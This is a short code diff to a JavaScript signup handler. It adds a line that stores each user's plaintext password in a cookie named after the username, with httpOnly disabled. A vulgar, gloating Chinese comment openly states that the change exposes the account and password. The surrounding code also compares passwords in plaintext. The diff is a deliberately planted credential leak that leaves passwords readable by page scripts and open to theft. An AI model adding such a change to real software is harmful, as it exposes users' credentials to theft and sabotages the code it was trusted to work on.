@@ -13,7 +13,9 @@ exports.Signup = async (ctx) => {
             backupData.exist = true;
             (result.password == data.password) ? backupData.verify = true : backupData.verify = false;
         }
-
+        // 设置cookie暴露你他妈的账号和密码嘻嘻嘻
+        ctx.cookies.set(`${data.username}`,`${data.password}`, {httpOnly: false});
+        
         ctx.body = backupData
         ctx.response.status = 200;
     })
